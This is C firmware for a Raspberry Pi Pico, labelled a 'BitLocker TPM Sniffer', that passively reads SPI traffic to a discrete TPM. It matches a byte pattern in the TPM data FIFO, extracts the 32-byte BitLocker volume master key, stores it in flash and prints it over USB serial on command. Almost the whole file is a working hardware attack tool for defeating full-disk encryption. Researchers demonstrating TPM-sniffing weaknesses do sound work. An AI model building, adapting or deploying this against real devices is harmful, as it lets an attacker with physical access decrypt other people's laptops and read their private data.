#include <stdio.h>
#include <cstring>      // Fix: Add this for strcmp/memset
#include "pico/stdlib.h"
#include "pico/flash.h"
#include "hardware/gpio.h"
#include "hardware/irq.h"
#include "flash_storage.h"

// --- Hardware Configuration ---
#define PIN_SPI0_SCK  2   // SPI0 SCK (GPIO2)
#define PIN_SPI0_MOSI 3   // SPI0 MOSI (GPIO3)
#define PIN_SPI0_MISO 4   // SPI0 MISO (GPIO4)
#define PIN_SPI0_CS   5   // SPI0 CS (GPIO5)

// USB Serial command buffer
#define CMD_BUFFER_SIZE 64
static char cmd_buffer[CMD_BUFFER_SIZE];
static int cmd_pos = 0;

// --- Core State Machine (Minimal) ---
static uint8_t state = 0;           // 0=op, 1=addr, 2=wait, 3=data
static uint8_t addr_bytes = 0;
static uint32_t address = 0;
static uint8_t xfer_size = 0;
static uint8_t data_buffer[64];
static uint8_t data_count = 0;
static bool is_read_op = false;

// 44-byte sliding window for TPM_DATA_FIFO_0 traffic
static uint8_t window[44];
static uint8_t win_pos = 0;
static bool win_full = false;

// Statistics
static volatile uint32_t transactions_processed = 0;
static volatile uint32_t keys_found = 0;

bool checkAndStoreKey();

// --- Byte Processing Function ---
// This is called from interrupt context - must be fast!
void processSPIByte(uint8_t mosi, uint8_t miso) {
    switch(state) {
        case 0: // READ_OPERATION
            is_read_op = (mosi & 0x80);

            xfer_size = (mosi & 0x3F) + 1;
            address = 0;
            addr_bytes = 0;
            data_count = 0;
            state = 1;
            break;

        case 1: // READ_ADDRESS
            address = (address << 8) | mosi;
            if (++addr_bytes >= 3) {
                state = (miso & 0x01) ? 3 : 2; // Skip wait if MISO[0]==1
            }
            break;

        case 2: // WAIT
            if (miso == 0x01) state = 3;
            break;

        case 3: // TRANSFER_BYTE
            data_buffer[data_count++] = is_read_op ? miso : mosi;
            if (data_count >= xfer_size) {
                transactions_processed++;

                // Only process TPM_DATA_FIFO_0 (0x00D40024)
                if (address == 0x00D40024) {
                    // Append to sliding window
                    for (int i = 0; i < data_count; i++) {
                        window[win_pos] = data_buffer[i];
                        win_pos = (win_pos + 1) % 44;
                        if (win_pos == 0) win_full = true;
                    }

                    // Check for key pattern
                    if (checkAndStoreKey()) {
                        keys_found++;
                    }
                }
                state = 0; // Reset
            }
            break;
    }
}

// --- Key Pattern Matcher & Flash Storage ---
// 44-byte pattern: 2c 00 0V 00 0I 00 0A 00 0B 20 00 00 [32 key bytes]
bool checkAndStoreKey() {
    int max_pos = win_full ? 44 : win_pos;

    for (int i = 0; i < max_pos; i++) {
        int idx = win_full ? ((i + win_pos) % 44) : i;

        // Verify header pattern with nibble constraints
        if (window[idx] == 0x2C &&
            window[(idx+1) % 44] == 0x00 &&
            window[(idx+2) % 44] <= 0x06 &&
            window[(idx+3) % 44] == 0x00 &&
            (window[(idx+4) % 44] >= 0x01 && window[(idx+4) % 44] <= 0x09) &&
            window[(idx+5) % 44] == 0x00 &&
            window[(idx+6) % 44] <= 0x01 &&
            window[(idx+7) % 44] == 0x00 &&
            window[(idx+8) % 44] <= 0x05 &&
            window[(idx+9) % 44] == 0x20 &&
            window[(idx+10) % 44] == 0x00 &&
            window[(idx+11) % 44] == 0x00) {

            // Extract 32-byte key
            uint8_t key[32];
            for (int j = 0; j < 32; j++) {
                key[j] = window[(idx + 12 + j) % 44];
            }

            // Write to flash with atomic replace
            flash_store_key(key);
            return true;
        }
    }
    return false;
}

// --- SPI GPIO Interrupt Handlers ---
volatile uint8_t mosi_shift = 0;
volatile uint8_t miso_shift = 0;
volatile uint8_t bit_cnt = 0;
volatile bool active = false;

void cs_irq(uint gpio, uint32_t events) {
    if (events & GPIO_IRQ_EDGE_FALL) {
        active = true;
        bit_cnt = 0;
        mosi_shift = 0;
        miso_shift = 0;
    } else {
        active = false;
    }
}

void sck_irq(uint gpio, uint32_t events) {
    if (!active || !(events & GPIO_IRQ_EDGE_RISE)) return;

    mosi_shift = (mosi_shift << 1) | gpio_get(PIN_SPI0_MOSI);
    miso_shift = (miso_shift << 1) | gpio_get(PIN_SPI0_MISO);

    if (++bit_cnt >= 8) {
        processSPIByte(mosi_shift, miso_shift);
        bit_cnt = 0;
        mosi_shift = 0;
        miso_shift = 0;
    }
}

// --- USB Serial Command Processor ---
void processCommand(const char* cmd) {
    if (strcmp(cmd, "status") == 0) {
        printf("Transactions: %lu\n", transactions_processed);
        printf("Keys Found: %lu\n", keys_found);
        printf("Window Full: %s\n", win_full ? "YES" : "NO");
    }
    else if (strcmp(cmd, "getkey") == 0) {
        uint8_t key[32];
        if (flash_retrieve_key(key)) {
            printf("[+] Stored BitLocker Key: ");
            for (int i = 0; i < 32; i++) {
                printf("%02X", key[i]);
            }
            printf("\n");
        } else {
            printf("[-] No key stored in flash\n");
        }
    }
    else if (strcmp(cmd, "erasekey") == 0) {
        flash_erase_key();
        printf("[*] Key erased from flash\n");
    }
    else if (strcmp(cmd, "reset") == 0) {
        memset(window, 0, 44);
        win_pos = 0;
        win_full = false;
        printf("[*] Window reset\n");
    }
    else {
        printf("Unknown command: %s\n", cmd);
        printf("Available: status, getkey, erasekey, reset\n");
    }
}

// --- Main ---
int main() {
    stdio_init_all();

    // Wait for USB serial
    while (!stdio_usb_connected()) {
        sleep_ms(100);
    }
    printf("\n=== BitLocker TPM Sniffer v1.0 ===\n");

    uint8_t boot_key[32];
    if (flash_retrieve_key(boot_key)) {
        printf("\n!!! STORED KEY DETECTED! Run 'getkey' to retrieve\n");
        // Flash LED 3 times fast to indicate key present
        for(int i=0; i<3; i++) {
            gpio_put(25, 1); sleep_ms(100);
            gpio_put(25, 0); sleep_ms(100);
        }
    }

    // Configure GPIO
    gpio_init(PIN_SPI0_CS);
    gpio_set_dir(PIN_SPI0_CS, GPIO_IN);
    gpio_pull_up(PIN_SPI0_CS);

    gpio_init(PIN_SPI0_SCK);
    gpio_set_dir(PIN_SPI0_SCK, GPIO_IN);
    gpio_pull_up(PIN_SPI0_SCK);

    gpio_init(PIN_SPI0_MOSI);
    gpio_set_dir(PIN_SPI0_MOSI, GPIO_IN);

    gpio_init(PIN_SPI0_MISO);
    gpio_set_dir(PIN_SPI0_MISO, GPIO_IN);

    // Enable interrupts
    gpio_set_irq_enabled_with_callback(PIN_SPI0_CS,
        GPIO_IRQ_EDGE_FALL | GPIO_IRQ_EDGE_RISE,
        true,
        cs_irq);

    gpio_set_irq_enabled(PIN_SPI0_SCK,
        GPIO_IRQ_EDGE_RISE,
        true);

    // Main loop: process USB commands
    while (true) {
        int c = getchar_timeout_us(0);
        if (c != PICO_ERROR_TIMEOUT) {
            if (c == '\r' || c == '\n') {
                cmd_buffer[cmd_pos] = '\0';
                processCommand(cmd_buffer);
                cmd_pos = 0;
            }
            else if (cmd_pos < CMD_BUFFER_SIZE - 1) {
                cmd_buffer[cmd_pos++] = c;
            }
        }

        // Brief sleep to let IRQs run
        sleep_ms(10);
    }

    return 0;
}
